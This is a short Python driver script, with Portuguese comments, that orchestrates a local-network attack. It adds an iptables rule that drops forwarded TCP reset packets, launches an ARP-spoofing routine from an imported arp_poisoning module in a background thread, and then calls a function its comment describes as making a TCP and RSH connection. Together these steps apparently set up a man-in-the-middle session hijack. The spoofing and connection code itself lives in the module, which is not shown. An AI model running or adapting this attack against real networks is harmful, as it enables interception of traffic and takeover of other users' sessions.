import arp_poisoning as ap
import threading
import os
import time

def main():
    os.system(f'iptables -A FORWARD -p tcp --tcp-flags RST RST -j DROP')
    
    #criação de trhead
    #ARPSPOOF
    thread = threading.Thread(target=ap.net_spoof)
    thread.daemon = True
    thread.start()
    print ("segunda trhead")
    time.sleep(2.5)



    #conexao TCP e RSH
    ap.conecta()
    





if __name__=="__main__":
    main()